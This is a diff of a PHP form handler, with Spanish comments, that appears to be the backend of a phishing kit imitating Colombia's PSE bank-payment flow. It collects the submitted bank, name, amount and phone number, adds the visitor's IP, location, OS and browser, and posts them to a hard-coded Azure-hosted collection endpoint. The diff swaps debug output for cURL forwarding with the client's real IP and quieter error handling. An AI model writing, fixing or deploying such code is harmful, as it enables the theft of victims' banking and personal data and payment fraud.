@@ -1,38 +1,26 @@
 <?php
-// ===== DEBUG DURO Y PAREJO (quitar en producción) =====
+ini_set('display_errors', 0);
 error_reporting(E_ALL);
-ini_set('display_errors', 1);
-ini_set('log_errors', 1);
-ini_set('error_log', __DIR__ . '/php-error.log');
 
-// Verifica requisitos para file_get_contents HTTPS
-$debug = [
-    'php_version'         => PHP_VERSION,
-    'allow_url_fopen'     => ini_get('allow_url_fopen'),
-    'openssl_loaded'      => extension_loaded('openssl'),
-    'default_socket_timeout' => ini_get('default_socket_timeout'),
-];
-
-// Captura POST
+// --- Lee POST (usa null coalescing para evitar notices) ---
 $numero  = $_POST['Inputphone']  ?? null;
 $cuanto  = $_POST['Inputcuanto'] ?? null;
 $persona = $_POST['Inputpersona']?? null;
 $entidad = $_POST['Inputbanc']   ?? null;
 
-// Evita notice si no definiste estas vars en funciones.php
-$myip      = $myip      ?? 'N/A';
-$pais      = $pais      ?? 'N/A';
-$region    = $region    ?? 'N/A';
-$user_os   = $user_os   ?? 'N/A';
-$navegador = $navegador ?? 'N/A';
+include('funciones.php'); // aquí defines $myip, $pais, etc. si aplica
 
-include('funciones.php'); // si aquí hay errores, se verán arriba
+if ($entidad === 'DAVIVIENDA') {
+    exit; // nada que hacer
+}
 
-if ($entidad !== 'DAVIVIENDA') {
-  if ($cuanto && $persona && $entidad) {
+if (!($cuanto && $persona && $entidad)) {
+    http_response_code(400);
+    exit('Faltan campos requeridos.');
+}
 
-    $message =
-"PSE
+// --- Construye mensaje ---
+$message = "PSE
 Banco: {$entidad}
 Persona: {$persona}
 Monto: {$cuanto}
@@ -42,64 +30,93 @@ Ip y Localidad: {$myip} {$pais} {$region}
 SO: {$user_os}
 Navegador: {$navegador}";
 
-    $payload = ['mensaje' => $message];
-    $json    = json_encode($payload, JSON_UNESCAPED_UNICODE);
+$payload = ['mensaje' => $message];
 
-    // Chequea errores de JSON
-    if ($json === false) {
-        $debug['json_error'] = json_last_error_msg();
-    }
-
-    $url = "https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/nesquis/";
-
-    // IMPORTANTÍSIMO: ignore_errors => true para poder leer body en 4xx/5xx
-    $options = [
-      "http" => [
-        "header"        => "Content-Type: application/json\r\nAccept: application/json\r\n",
-        "method"        => "POST",
-        "content"       => $json,
-        "timeout"       => 20,
-        "ignore_errors" => true,
-      ]
+// --- Obtén la IP real del cliente para reenviarla ---
+function getClientIp(): string {
+    $candidates = [
+        $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '',
+        $_SERVER['HTTP_X_REAL_IP'] ?? '',
+        $_SERVER['REMOTE_ADDR'] ?? '',
     ];
-
-    $context  = stream_context_create($options);
-    $response = @file_get_contents($url, false, $context); // @ para capturar con error_get_last
-
-    // Status y headers
-    $status_line = $http_response_header[0] ?? 'NO_STATUS_LINE';
-    $headers     = $http_response_header ?? [];
-
-    if ($response === false) {
-        $php_last_error = error_get_last();
+    foreach ($candidates as $val) {
+        if (!$val) continue;
+        foreach (explode(',', $val) as $ip) { // XFF puede traer lista
+            $ip = trim($ip);
+            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE|FILTER_FLAG_NO_RES_RANGE)) {
+                return $ip; // pública
+            }
+        }
+        foreach (explode(',', $val) as $ip) {
+            $ip = trim($ip);
+            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip; // privada si no hubo pública
+        }
     }
-
-    // ===== Salida de diagnóstico =====
-    header('Content-Type: text/plain; charset=utf-8');
-    echo "=== DEBUG AZURE PHP ===\n";
-    foreach ($debug as $k=>$v) echo "$k: $v\n";
-    echo "\n=== REQUEST ===\n";
-    echo "URL: $url\n";
-    echo "Payload JSON:\n$json\n";
-    echo "\n=== RESPONSE HEADERS ===\n";
-    echo $status_line . "\n";
-    foreach ($headers as $h) echo $h . "\n";
-    echo "\n=== RESPONSE BODY ===\n";
-    echo (string)$response . "\n";
-
-    if (!empty($php_last_error)) {
-        echo "\n=== PHP LAST ERROR ===\n";
-        print_r($php_last_error);
-    }
-
-    exit; // evita seguir renderizando otra cosa
-  } else {
-    header('Content-Type: text/plain; charset=utf-8');
-    echo "Faltan campos POST: Inputcuanto, Inputpersona o Inputbanc.\n";
-    var_export(['Inputphone'=>$numero,'Inputcuanto'=>$cuanto,'Inputpersona'=>$persona,'Inputbanc'=>$entidad]);
-    exit;
-  }
+    return '0.0.0.0';
 }
+$clientIp = getClientIp();
+
+// --- Envío cURL con headers extra y logging ---
+$url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/nesquis/';
+$ch = curl_init($url);
+
+$verbose = fopen('php://temp', 'w+'); // buffer para log VERBOSE
+
+curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_POST           => true,
+    CURLOPT_HTTPHEADER     => [
+        'Accept: application/json',
+        'Content-Type: application/json',
+        'X-Client-IP: ' . $clientIp,              // <- IP real del usuario
+        'X-Forwarded-For: ' . $clientIp,          // <- opcional, por compatibilidad
+    ],
+    CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
+    CURLOPT_TIMEOUT        => 20,
+    CURLOPT_CONNECTTIMEOUT => 10,
+    CURLOPT_HEADER         => true,               // incluye headers en la respuesta
+    CURLOPT_SSL_VERIFYPEER => true,
+    CURLOPT_SSL_VERIFYHOST => 2,
+    CURLOPT_VERBOSE        => true,
+    CURLOPT_STDERR         => $verbose,
+]);
+
+$raw = curl_exec($ch);
+
+if ($raw === false) {
+    $err = curl_error($ch);
+    curl_close($ch);
+    error_log('cURL error: ' . $err);
+    http_response_code(502);
+    exit('Error de red: ' . $err);
+}
+
+$httpCode    = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+$resp_headers = substr($raw, 0, $header_size);
+$resp_body    = substr($raw, $header_size);
+
+curl_close($ch);
+
+rewind($verbose);
+$verboseLog = stream_get_contents($verbose);
+
+// --- Manejo básico según código ---
+if ($httpCode >= 400) {
+    // Loguea todo para depurar
+    error_log("[API ERROR] HTTP $httpCode\nHEADERS:\n$resp_headers\nBODY:\n$resp_body\nVERBOSE:\n$verboseLog");
+} else {
+    // Igual puede ser útil guardar el verbose en debug
+    // error_log("[API OK] HTTP $httpCode\n$resp_body");
+}
+
+// --- Devuelve algo útil al caller (tu frontend, por ejemplo) ---
+header('Content-Type: application/json; charset=utf-8');
+echo json_encode([
+    'status'       => $httpCode,
+    'client_ip'    => $clientIp,    // lo que reenviamos
+    'response_raw' => json_decode($resp_body, true) ?? $resp_body, // parsea si es JSON
+], JSON_UNESCAPED_UNICODE);
 
 ?>
 
